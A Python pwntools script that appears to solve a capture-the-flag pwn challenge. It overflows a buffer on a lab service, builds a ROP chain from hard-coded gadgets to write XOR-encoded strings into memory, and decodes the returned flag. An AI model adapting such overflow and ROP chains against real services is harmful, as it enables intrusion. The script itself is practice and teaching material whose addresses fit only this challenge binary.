from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# 0x00000000004020af : pop rdi ; ret
# 0x0000000000485e8b : pop rdx ; pop rbx ; ret
# 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret


def main(r):
    # attach(
    #     r,
    #     """
    #     b *0x40189e
    #     conti
    #     """,
    # )

    r.recvuntil(b"secret = ")
    secret = r.recvline().decode().strip()
    secret = int(secret, 16)
    r.recvuntil(b"> ")

    log.info(f"secret = {hex(secret)}")

    v1 = u64(b"kyoumoka")
    v2 = u64(b"waii".ljust(8, b"\x00"))
    # log.info(f"v1 = {p64(v1)}")
    # log.info(f"v2 = {p64(v2)}")
    v1 ^= secret
    v2 ^= secret
    log.info(f"v1 = {p64(v1)}")
    log.info(f"v2 = {p64(v2)}")
    ropc = flat(
        [
            #
            [0x00000000004020AF, 0x4C7320],  # pop rdi ; ret  # rdi = 0x4C7320
            [0x0000000000485E8B, v1],  # pop rdx ; pop rbx ; ret  # rdx = "kyoumoka"
            0x4141414141414141,  # rbx = "AAAAAAA"
            0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
            #
            [0x00000000004020AF, 0x4C7320 + 8],  # pop rdi ; ret  # rdi = 0x4C7328
            [0x0000000000485E8B, v2],  # pop rdx ; pop rbx ; ret  # rdx = "waii"
            0x4141414141414141,  # rbx = "AAAAAAA"
            0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
            #
            [0x00000000004020AF, 0x4C7320],  # pop rdi ; ret  # rdi = 0x4C7320
            0x4017BA,  # check address
        ]
    )
    payload = b"a" * 0x28 + ropc
    # input()
    r.sendline(payload)
    # print(payload)
    r.recvuntil(b"flag = ")
    res = r.recvline()
    while len(res) < 16:
        log.info(f"res = {res}, len = {len(res)}")
        res += r.recvline()
    res = res[:16]
    log.info(f"res = {res}, len = {len(res)}")
    flag = p64(u64(b"kyoumoka") ^ secret ^ u64(res[0:8]))
    flag += p64(u64(b"waii".ljust(8, b"\x00")) ^ secret ^ u64(res[8:16]))
    flag = flag.decode().strip()
    log.info(f"flag = {flag}")

    # r.interactive()


if __name__ == "__main__":
    try:
        r = remote("10.113.184.121", 10051)
        main(r)
    except Exception as e:
        log.warning(f"{type(e).__name__}: {e}")
    finally:
        r.close()
